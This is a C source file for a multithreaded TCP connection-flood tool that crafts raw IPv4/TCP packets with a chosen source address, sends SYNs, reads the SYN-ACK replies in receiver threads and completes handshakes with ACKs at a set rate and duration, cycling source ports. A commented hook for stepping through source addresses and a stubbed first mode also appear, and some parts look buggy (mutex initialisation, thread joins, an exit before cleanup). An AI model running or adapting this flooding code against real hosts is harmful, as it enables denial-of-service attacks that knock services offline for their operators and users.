#include "header.h"

#include "make_ipv4.h"
#include "make_tcp.h"
#include "receiver.h"

unsigned int conn_total;
unsigned int conn_produced;
unsigned int conn_received;

unsigned int conn_per_second;
unsigned int conn_duration;
double conn_elapsed_time;

char *conn_dest_ip;
char *conn_src_ip;
int conn_src_port;
int conn_dest_port;

int conn_generated_count;
short conn_timed_finisher;
short conn_receiver_count;
short* conn_receiving_flag;


pthread_mutex_t conn_mutex;
pthread_cond_t conn_cond;

pthread_mutex_t *conn_recv_mutex;
pthread_cond_t *conn_recv_cond;

struct recv *conn_recvd;

void conn_flood_print_usage(int mode) {

	if (mode == 1)
		printf(
				"CONN flood Usage : [Src-IP] [Dest-IP] [# thread] [# requests(0 for INF)] [Src-Port] [Dest-Port] \n");
	if (mode == 2)
		printf(
				"CONN flood Usage : [Src-IP] [Dest-IP] [# thread] [# per seconds(0 for INF)] [duration (0 for INF)] [Src-Port] [Dest-Port]\n");
}

void* generate_conn_flooding1(void *data) {
	int thread_id = *((int*) data);
	int sock = make_socket(IPPROTO_TCP);
	/*	while (1) {

		struct iphdr ipv4_h;
		ipv4_h = prepare_empty_ipv4();
		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_TCP);
		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(tcpsyn_src_ip));
*/
		/*** If you want to modify ip address*/
		//next_ip_addr(tcpsyn_src_ip, 1);
/*	ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(tcpsyn_dest_ip));

		struct tcphdr tcp_h;
		tcp_h = prepare_empty_tcp();
		tcp_h = tcp_set_source(tcp_h, tcpsyn_src_port);
		tcp_h = tcp_set_dest(tcp_h, tcpsyn_dest_port);
		tcp_h = tcp_set_seq(tcp_h, tcpsyn_produced);

		//tcp_h = tcp_set_ack_seq(tcp_h,35623);
		/***For SYN TCP request, ACK seq should not be provided.*/
/*
		tcp_h = tcp_set_syn_flag(tcp_h);

		tcp_h = tcp_get_checksum(ipv4_h, tcp_h,NULL, 0);

		ipv4_h = ipv4_add_size(ipv4_h, sizeof(tcp_h));
		char *packet = packet_assemble(ipv4_h, &tcp_h, sizeof(tcp_h));

		printf("%d\n", ((struct iphdr*) packet)->tot_len);

		pthread_mutex_lock(&tcpsyn_mutex);

		if (tcpsyn_produced >= tcpsyn_total) {
			pthread_mutex_unlock(&tcpsyn_mutex);
			pthread_cond_broadcast(&tcpsyn_cond);
			return 0;
		}

		send_packet(sock, ipv4_h, packet, tcpsyn_dest_port);
		tcpsyn_generated_count++;
		free(packet);
		tcpsyn_produced++;

		pthread_mutex_unlock(&tcpsyn_mutex);
	}
	close(sock);
	return 0;
	*/
	return NULL;
}

void* generate_conn_flooding2(void *data) {
	int thread_id = *((int*) data);
	int sock = make_socket(IPPROTO_TCP);
	while (1) {

		struct iphdr ipv4_h;
		ipv4_h = prepare_empty_ipv4();
		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_TCP);
		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(conn_src_ip));

		//modify tcpsyn_src_ip, increment 1.
		//next_ip_addr(tcpsyn_src_ip, 1);

		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(conn_dest_ip));

		struct tcphdr tcp_h;
		tcp_h = prepare_empty_tcp();
		tcp_h = tcp_set_source(tcp_h, conn_src_port);
		tcp_h = tcp_set_dest(tcp_h, conn_dest_port);
		tcp_h = tcp_set_seq(tcp_h, conn_total);
		//tcp_h = tcp_set_ack_seq(tcp_h,35623);

		tcp_h = tcp_set_syn_flag(tcp_h);

		tcp_h = tcp_get_checksum(ipv4_h, tcp_h,NULL, 0);

		ipv4_h = ipv4_add_size(ipv4_h, sizeof(tcp_h));
		char *packet = packet_assemble(ipv4_h, &tcp_h, sizeof(tcp_h));

		pthread_mutex_lock(&conn_mutex);

		if (conn_elapsed_time >= conn_duration) {
			pthread_mutex_unlock(&conn_mutex);
			pthread_cond_broadcast(&conn_cond);
			conn_timed_finisher=1;
			return 0;
		}

		if (conn_produced == conn_per_second) {
			pthread_cond_wait(&conn_cond, &conn_mutex);
		}
		printf("SEND [1] id:%d\n",thread_id);
		send_packet(sock, ipv4_h, packet,conn_dest_port);
		conn_generated_count++;
		free(packet);

		conn_receiving_flag[thread_id]=1;
		conn_recvd[thread_id].socket = sock;

		if(conn_receiving_flag[thread_id]==1)
			pthread_cond_wait(&conn_cond,&conn_mutex);

		ipv4_h = prepare_empty_ipv4();
		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_TCP);
		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(conn_src_ip));

		//modify tcpsyn_src_ip, increment 1.
		//next_ip_addr(tcpsyn_src_ip, 1);

		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(conn_dest_ip));

		tcp_h = prepare_empty_tcp();
		tcp_h = tcp_set_source(tcp_h, conn_src_port);
		tcp_h = tcp_set_dest(tcp_h, conn_dest_port);
		tcp_h = tcp_set_seq(tcp_h, conn_recvd[thread_id].ack_seq_num);
		tcp_h = tcp_set_ack_seq(tcp_h,conn_recvd[thread_id].seq_num+1);

		tcp_h = tcp_set_ack_flag(tcp_h);

		tcp_h = tcp_get_checksum(ipv4_h, tcp_h,NULL, 0);

		ipv4_h = ipv4_add_size(ipv4_h, sizeof(tcp_h));
		packet = packet_assemble(ipv4_h, &tcp_h, sizeof(tcp_h));


		printf("SEND [2] \n");
		send_packet(sock, ipv4_h, packet, conn_dest_port);
		conn_generated_count++;
		free(packet);

		conn_produced++;
		conn_total++;

		conn_src_port++;
		//conn_dest_port++;

		pthread_mutex_unlock(&conn_mutex);
	}
	close(sock);
	return 0;
}


void* conn_time_check(void *data) {
	int thread_id = *((int*) data);
	clock_t t1, t2;
	t1 = clock();
	clock_t elapsed_time = clock();
	double time_taken;

	while (1) {
		pthread_mutex_lock(&conn_mutex);
		if(conn_timed_finisher==1) return 0;
		t2 = clock();
		time_taken = ((double) (t2 - t1)) / CLOCKS_PER_SEC;

		if (time_taken >= 1.0) {
			conn_produced = 0;
			t1 = clock();
			time_taken = 0;
			conn_elapsed_time = ((double) (t1 - elapsed_time))
					/ CLOCKS_PER_SEC;
			pthread_cond_signal(&conn_cond);
		}
		pthread_mutex_unlock(&conn_mutex);
	}
}
void* receive_conn(void *data) {
	int thread_id = conn_receiver_count;
	conn_receiver_count ++;

	while(1)
	{
		pthread_mutex_lock(&conn_mutex);
		while(conn_receiving_flag[thread_id]==0)
			pthread_cond_wait(&conn_cond,&conn_mutex);
		printf("RECEIVER START id:%d \n",thread_id);

		unsigned char data[__MAX_RECV_MSG_LENGTH__];
		conn_recvd[thread_id] = get_response(conn_recvd[thread_id].socket);
		packet_dismantle(conn_recvd[thread_id],NULL,data);

		memcpy(&(conn_recvd[thread_id].seq_num),data+4,4);
		memcpy(&(conn_recvd[thread_id].ack_seq_num),data+8,4);
		conn_recvd[thread_id].seq_num = ntohl(conn_recvd[thread_id].seq_num);
		conn_recvd[thread_id].ack_seq_num = ntohl(conn_recvd[thread_id].ack_seq_num);

		conn_receiving_flag[thread_id]=0;
		pthread_cond_signal(&conn_cond);

		printf("RECEIVER END id:%d \n",thread_id);
		pthread_mutex_unlock(&conn_mutex);
	}

}

void conn_flood_run(char *argv[], int mode) {

	conn_src_ip = (char*) malloc(sizeof(char) * 20);
	conn_dest_ip = (char *)malloc(sizeof(char) * 20);
	int argc = 0;
	conn_generated_count = 0;
	conn_timed_finisher=0;
	conn_receiver_count = 0;
	while (argv[argc] != NULL) {
		argc++;
	}

	if (mode == 1 && argc != 6) {
		conn_flood_print_usage(mode);
		return;
	} else if (mode == 2 && argc != 7) {
		conn_flood_print_usage(mode);
		return;
	}

	strcpy(conn_src_ip, argv[0]);

	conn_mutex = PTHREAD_MUTEX_INITIALIZER;
	conn_cond = PTHREAD_COND_INITIALIZER;
	conn_produced = 0;
	if (mode == 1) {
		conn_total = atoi(argv[3]);
		conn_src_port = atoi(argv[4]);
		conn_dest_port = atoi(argv[5]);

		if (conn_total == 0)
			conn_total = __UINT_MAXIMUM__;

	}

	if (mode == 2) {
		conn_total = 0;
		conn_per_second = atoi(argv[3]);
		conn_duration = atoi(argv[4]);
		if (conn_duration == 0)
			conn_duration = __UINT_MAXIMUM__;



		if (conn_per_second == 0)
			conn_per_second = __UINT_MAXIMUM__;

		conn_src_port = atoi(argv[5]);
		conn_dest_port = atoi(argv[6]);
	}

	int num_threads = atoi(argv[2]);

	conn_dest_ip = argv[1];
	strcpy(conn_dest_ip,argv[1]);

	int *generate_thread_id, *receive_thread_id;
	pthread_t *generate_thread, *receive_thread;
	conn_receiving_flag = (short*)malloc(sizeof(short)*num_threads);
	generate_thread_id = (int*) malloc(sizeof(int) * (num_threads + 1));
	generate_thread = (pthread_t*) malloc(
			sizeof(pthread_t) * (num_threads + 1));
	receive_thread = (pthread_t*)malloc(sizeof(pthread_t)*(num_threads));
	receive_thread_id = (int*) malloc(sizeof(int) * (num_threads));


	conn_recvd = (struct recv*)malloc(sizeof(struct recv)*(num_threads));

	int i;

	printf("Sending CONN requests to %s using %d threads\n", conn_dest_ip,
			num_threads);
	for (i = 0; i < num_threads; i++)
		generate_thread_id[i] = i;

	for (i = 0; i < num_threads; i++) {
		if (mode == 1)
			pthread_create(&generate_thread[i], NULL, generate_conn_flooding1,
					(void*) &generate_thread_id[i]);
		if (mode == 2)
		{
			pthread_create(&generate_thread[i], NULL, generate_conn_flooding2,
								(void*) &generate_thread_id[i]);
			pthread_create(&receive_thread[i],NULL,receive_conn,(void*)&receive_thread_id[i]);
		}

	}

	if (mode == 2) {
		pthread_create(&generate_thread[i], NULL, conn_time_check,
				(void*) &generate_thread_id[i]);
		num_threads++;
	}

	for (i = 0; i < num_threads; i++) {
		void *status1,*status2;
		pthread_join(generate_thread[i], &status1);
		pthread_join(receive_thread[i],&status2);
		printf("threads %d joined\n", i);
	}

	printf("SYN flood finished\nTotal %d packets sent.\n",conn_generated_count);

	pthread_mutex_destroy(&conn_mutex);
	pthread_exit(NULL);

	free(generate_thread_id);
	free(generate_thread);
	free(receive_thread);
	free(receive_thread_id);
	free(conn_receiving_flag);
	free(conn_src_ip);
	free(conn_dest_ip);

	return;
}

